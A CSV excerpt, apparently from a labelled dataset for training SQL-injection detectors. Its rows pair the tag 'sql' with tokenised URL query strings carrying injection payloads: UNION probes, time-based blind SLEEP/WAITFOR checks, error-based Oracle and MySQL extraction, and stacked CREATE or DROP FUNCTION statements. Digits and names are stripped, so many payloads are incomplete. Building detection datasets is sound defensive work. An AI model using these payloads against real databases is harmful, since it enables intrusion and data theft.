3789,sql,". . . . / / / / ? = & = & =  - ) UNION ALL SELECT , ,  -- "
3790,sql,". . . / / ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL -- "
3791,sql,". . / ? = & = & = & =   ( CASE WHEN = THEN ' ' ELSE NULL END ) "
3792,sql,". . ? = & =  - ORDER BY # "
3793,sql,". . / / / / ? = & = & =  - ' UNION ALL SELECT , # "
3794,sql,". . . . / / ? =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3795,sql,". . . / / / / ? = & =   % ' ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3796,sql,". . . / / ? = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3797,sql,". . . . / / / / ? = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3798,sql,". . . . / / / ? = & = & = & =   ' ) ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
3799,sql,". . . . / / / ? = & = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
3800,sql,". . . / / ? = & = & = & =   ' ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ( ( ' crVC ' = ' "
3801,sql,". . . . / ? = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3802,sql,". . . . ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3803,sql,". . / / ? =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' fFbc ' = ' "
3804,sql,". . . / / / ? =   ) ) ) ORDER BY  -- "
3805,sql,". . . ? = & = & = & =   "" ) AND = AND ( " alIS " LIKE " "
3806,sql,". . . / / / ? =   ' UNION ALL SELECT NULL -- "
3807,sql,". . . . / / / ? =  - ' UNION ALL SELECT , , , , # "
3808,sql,". . ? = & = & = & =   % "" AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) eJit ) # "
3809,sql,". . . . / / / ? =   ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' eSLo ' = ' "
3810,sql,". . . . / ? = & = & =  - ' ) UNION ALL SELECT , , , , , , # "
3811,sql,". . . / ? =   AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) # "
3812,sql,". . / ? = & =   "" AND =  -- "
3813,sql,". . / / / / ? = & = & =   ' ) ) AND =  -- "
3814,sql,". . . / / / / ? = & = & =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ' VssE ' = ' "
3815,sql,". . . / / / / ? =  - ' UNION ALL SELECT  -- "
3816,sql,". . . . ? = & =   % ' ) RLIKE SLEEP ( ) AND ( ' % ' = ' "
3817,sql,". . . . / / / / ? = & = & =  - ) UNION ALL SELECT , , , , , ,  -- "
3818,sql,". . . . / / / ? = & = & = & =   % ' ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ' % ' = ' "
3819,sql,". . . / / / ? =   % ' AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
3820,sql,". . . . / / ? =   % "" AND =  -- "
3821,sql,". . . / ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3822,sql,". . . / ? = & =   ' ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3823,sql,". . . . / / ? =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3824,sql,". . . . / / / ? = & =   ) WAITFOR DELAY ' : : ' AND ( = "
3825,sql,". . . . ? = & =   UNION ALL SELECT NULL , NULL # "
3826,sql,". . . . / ? =   ) ) ) UNION ALL SELECT NULL # "
3827,sql,". . . / / / ? = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) ) "
3828,sql,". . . / ? =   ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
3829,sql,". . . / ? = & = & = & =   ) AND = % "
3830,sql,". . . / / ? = & = & =  - ' ) UNION ALL SELECT , , , , , , , ,  -- "
3831,sql,". . . / ? = & = & = & =   ' AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ' ykIg ' LIKE ' "
3832,sql,". . . / / / ? = & = & =   ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3833,sql,". . / ? =    AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL # "
3834,sql,". . . . / / ? =   % "" AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND " % " = " "
3835,sql,". . / / ? = & = & = & =   "" ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( " AggR " = " "
3836,sql,". . . / ? = & = & =  - % ' UNION ALL SELECT , ,  -- "
3837,sql,". . . . / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3838,sql,". . . / / ? = & = & = & =   % ' ) ) ORDER BY # "
3839,sql,". . . / / / / ? = & = & =   ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' Ldnq ' = ' "
3840,sql,". . . ? =   "" ORDER BY  -- "
3841,sql,". . . . / / / ? = & = & =   ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3842,sql,". . . . / / ? = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3843,sql,". . . / / ? = & = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3844,sql,". . / / / ? = & =   ' ) ) AND = # "
3845,sql,". . . / / ? = & = & = & =   "" AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND " FrUu " = " "
3846,sql,". . . / / ? = & = & =   "" AND MAKE_SET ( = , ) AND " olOX " = " "
3847,sql,". . . . / / / / ? =   ' ) ORDER BY # "
3848,sql,". . / ? = & = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE CAST ( AS INT ) / ( SELECT  FROM DUAL ) END ) FROM DUAL )  -- "
3849,sql,". . . / / / / ? = & =   ' ) ) AND = # "
3850,sql,". . / / / / ? =   % ' ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
3851,sql,". . . / / / ? = & = & = & =   ' ) ) AND SLEEP ( ) # "
3852,sql,". . . / / / ? =   ) ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) tqiZ ) # "
3853,sql,". . / / ? = & = & =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' OiSK ' LIKE ' "
3854,sql,". . / ? = & = & =   ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( = "
3855,sql,". . . . ? = & = & = & =   ) ) ; SELECT SLEEP ( ) # "
3856,sql,". . / ? =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ' zdjF ' = ' "
3857,sql,". . / / / ? =    AND =  -- "
3858,sql,". . . . ? = & = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) ) "
3859,sql,". . . . / / / / ? =   ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
3860,sql,". . / / / / ? = & = & =   "" AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " OXLt " = " "
3861,sql,". . / ? = & = & =   % ' ) ; WAITFOR DELAY ' : : '  --"
3862,sql,". . . . / / / ? = & = & =   "" ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( " joej " LIKE " "
3863,sql,". . . / / / ? = & = & =   "" AND SLEEP ( ) # "
3864,sql,". . / ? = & =   % ' AND =  -- "
3865,sql,". . . / / / ? = & =   ' AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ' scip ' = ' "
3866,sql,". . . . / ? = & =  - ' ) UNION ALL SELECT , , , , , ,  -- "
3867,sql,". . / / / / ? = & = & =   ' AND = AND ' DShY ' LIKE ' "
3868,sql,". . ? = & =   ' ) ) ORDER BY # "
3869,sql,". . . . / / ? = & = & = & =   ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
3870,sql,". . / / ? =   ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( = "
3871,sql,". . . / / / / ? = & =   ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( ( = "
3872,sql,". . ? =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3873,sql,". . . . / / ? = & = & =   ' AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ' zywW ' = ' "
3874,sql,". . . . / / ? = & = & =   ' ) ) ) AND MAKE_SET ( = , ) AND ( ( ( ' gXzv ' = ' "
3875,sql,". . . . / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL -- "
3876,sql,". . . / / / / ? = & =  - ' UNION ALL SELECT , , , , ,  -- "
3877,sql,". . . . / / ? = & = & = & =   "" AND =  -- "
3878,sql,". . / / / ? = & =  - ' ) UNION ALL SELECT , , , , , ,  -- "
3879,sql,". . . / / / / ? = & =   % ' ) AND MAKE_SET ( = , ) AND ( ' % ' = ' "
3880,sql,". . . . / / ? =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL -- "
3881,sql,". . / ? = & =   AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
3882,sql,". . . . / / / ? = & = & =   % ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' % ' = ' "
3883,sql,". . . / / / ? = & = & =   ) ; SELECT SLEEP ( )  -- "
3884,sql,". . / ? =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3885,sql,". . / / / ? = & = & = & =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL -- "
3886,sql,". . . . / / / ? = & = & =   AND =  -- "
3887,sql,". . . / / / ? = & = & =   AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) "
3888,sql,". . . / / ? = & = & =   "" ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3889,sql,". . . . ? = & = & = & =   , ( SELECT ( CASE WHEN ( = ) THEN DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) ELSE / ( SELECT  FROM DUAL ) END ) FROM DUAL ) "
3890,sql,". . . . / / ? = & =   ) ) ) ; SELECT SLEEP ( ) AND ( ( ( = "
3891,sql,". . . . / / / ? = & =   ' ) ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ( ( ' IVlB ' = ' "
3892,sql,". . / / / ? = & = & = & =  - ' ) ) ) UNION ALL SELECT , , , # "
3893,sql,". . . ? =   "" ) ) ORDER BY  -- "
3894,sql,". . . / / / / ? =   ' ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ' Rgyi ' LIKE ' "
3895,sql,". . . . ? = & = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3896,sql,". . / ? = & = & = & =  - ' ) ) ) UNION ALL SELECT , , , , # "
3897,sql,". . . . / / / / ? = & = & =   ' ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
3898,sql,". . / / / / ? = & = & = & =   ' ) ; SELECT SLEEP ( ) # "
3899,sql,". . / / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3900,sql,". . . . / / / ? = & = & =   AND =  -- "
3901,sql,". . . . ? =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3902,sql,". . . . / / / ? = & = & =   ' ) ORDER BY  -- "
3903,sql,". . . . / / ? = & = & =  - ) UNION ALL SELECT , , , , , , , ,  -- "
3904,sql,". . . / / / / ? = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3905,sql,". . . / / ? = & = & =  - "" UNION ALL SELECT , , , , , , , # "
3906,sql,". . . / / / / ? = & = & = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE / END ) FROM SYSMASTER : SYSDUAL ) "
3907,sql,". . / ? = & = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3908,sql,". . . / / ? = & = & = & =   ' ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
3909,sql,". . . . / ? = & =   ) ) UNION ALL SELECT NULL -- "
3910,sql,". . / / ? =   ' AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
3911,sql,". . . . ? = & =  - ' ) UNION ALL SELECT , , , , , # "
3912,sql,". . . . / / / ? = & = & =   ' ) AND = AND ( ' gBzv ' = ' "
3913,sql,". . / / ? =   "" ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( " LvcP " LIKE " "
3914,sql,". . . ? =   ' , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s )  -- "
3915,sql,". . . . ? =   ) AND = # "
3916,sql,". . . ? = & = & =   % ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' % ' = ' "
3917,sql,". . / / ? = & = & = & =   , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s ) "
3918,sql,". . / ? =  - % "" UNION ALL SELECT , , , , , , , , ,  -- "
3919,sql,". . ? = & = & = & =   ) ) ) ORDER BY  -- "
3920,sql,". . . / ? =   % ' ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( ' % ' = ' "
3921,sql,". . . / / / / ? = & = & = & =  - ' UNION ALL SELECT , ,  -- "
3922,sql,". . / ? = & = & =   ) AND =  -- "
3923,sql,". . / / / / ? = & = & = & =   "" AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND " jBhQ " LIKE " "
3924,sql,". . . ? = & =   ) ORDER BY  -- "
3925,sql,". . . / / ? = & = & = & =   "" AND =  -- "
3926,sql,". . . / / / ? = & = & =   % "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3927,sql,". . / ? = & = & =   "" ) RLIKE SLEEP ( ) AND ( " HhZG " = " "
3928,sql,". . . . / / ? = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3929,sql,". . . / / ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3930,sql,". . / ? =   "" ) ; SELECT SLEEP ( ) AND ( " yViN " LIKE " "
3931,sql,". . . / ? =   % ' ORDER BY # "
3932,sql,". . . ? =   ' ) RLIKE SLEEP ( ) AND ( ' sdtu ' = ' "
3933,sql,". . . / / / / ? = & = & =   % "" ; IF ( = ) SELECT  ELSE DROP FUNCTION YKes --"
3934,sql,". . . . / / / ? = & = & = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3935,sql,". . / / ? = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3936,sql,". . / / / ? = & = & = & =  - "" ) UNION ALL SELECT , , , , , , , # "
3937,sql,". . . . / ? = & = & =   ' ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( ' mqdG ' LIKE ' "
3938,sql,". . . / ? = & = & =    ORDER BY # "
3939,sql,". . / / / ? = & = & =   ' AND MAKE_SET ( = , ) AND ' hPCz ' LIKE ' "
3940,sql,". . / / ? = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3941,sql,". . . / / / / ? = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL -- "
3942,sql,". . . / / ? = & =   ) ) AND = AND ( ( = "
3943,sql,". . . / / / ? = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3944,sql,". . . ? = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL -- "
3945,sql,". . / / ? = & =    ORDER BY  -- "
3946,sql,". . . . / / / / ? = & =   % ' ) ) ; SELECT SLEEP ( ) AND ( ( ' % ' = ' "
3947,sql,". . / ? = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' ZipV ' LIKE ' "
3948,sql,". . / / / / ? = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3949,sql,". . . . / / / ? =  - ' UNION ALL SELECT , , , , ,  -- "
3950,sql,". . . . / / / ? = & =   ) ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ( = "
3951,sql,". . . ? = & = & =   ' ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ' FsIA ' LIKE ' "
3952,sql,". . . . / / ? = & = & = & =   "" AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " SRQe " = " "
3953,sql,". . / / ? =   % ' ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ' % ' = ' "
3954,sql,". . . . ? = & = & =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' MEbL ' LIKE ' "
3955,sql,". . / / / ? =   ' , ( BEGIN IF ( = ) THEN DBMS_LOCK . SLEEP ( ) ; ELSE DBMS_LOCK . SLEEP ( ) ; END IF ; END ; )  -- "
3956,sql,". . . / / ? = & = & =   ' ) ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION qmbT --"
3957,sql,". . / / / ? = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( = "
3958,sql,". . ? =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3959,sql,". . / / / / ? = & = & = & =   ) ) UNION ALL SELECT NULL , NULL , NULL # "
3960,sql,". . / ? =   ' ) ; SELECT SLEEP ( ) AND ( ' pKkj ' = ' "
3961,sql,". . . . / / ? = & =   "" ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( " luuw " = " "
3962,sql,". . . . / ? = & = & = & =   , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
3963,sql,". . . . / / / / ? =   % ' ) ; WAITFOR DELAY ' : : '  --"
3964,sql,". . . / / / ? = & = & =   "" ) ; WAITFOR DELAY ' : : '  --"
3965,sql,". . . / ? = & =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3966,sql,". . / / ? = & =   "" ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( " ZKwR " LIKE " "
3967,sql,". . . . / / / / ? = & =   % "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND " % " = " "
3968,sql,". . . . / / ? = & =  - ' UNION ALL SELECT , , , , , , , , , # "
3969,sql,". . . . / ? =   ) ) ; SELECT PG_SLEEP ( )  --"
3970,sql,". . / / / / ? = & = & = & =   "" AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " SRQe " = " "
3971,sql,". . . . / ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3972,sql,". . . . / / / ? = & =   ' UNION ALL SELECT NULL # "
3973,sql,". . . . / / ? = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3974,sql,". . / / / / ? = & = & =  - ' ) ) ORDER BY # "
3975,sql,". . . / / / ? = & = & = & =  - % ' ) UNION ALL SELECT , , , , , , , , # "
3976,sql,". . . / / / ? = & = & = & =  - ' ) ) ) UNION ALL SELECT , , ,  -- "
3977,sql,". . . / ? =  - ' ) UNION ALL SELECT , , , , , , , ,  -- "
3978,sql,". . . / ? = & =   ' ) ) ) UNION ALL SELECT NULL , NULL # "
3979,sql,". . / ? = & = & = & =   ( CASE WHEN ( = ) THEN SLEEP ( ) ELSE  END ) "
3980,sql,". . . / ? = & = & =   ' ) AND SLEEP ( ) AND ( ' lBWb ' = ' "
3981,sql,". . . . / / / ? = & = & =   ' ) ) UNION ALL SELECT NULL -- "
3982,sql,". . . / / / ? = & = & =   ' ) ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ( ' dtvs ' = ' "
3983,sql,". . . . / ? = & = & =   % ' ) ) WAITFOR DELAY ' : : ' AND ( ( ' % ' = ' "
3984,sql,". . . . / / / ? = & = & =   % ' ) ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
3985,sql,". . / / / ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3986,sql,". . . . ? = & =   % ' ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
3987,sql,". . . . / / ? = & =  - ' ) ) UNION ALL SELECT , , , # "
3988,sql,". . . ? =  - ' UNION ALL SELECT , ,  -- "
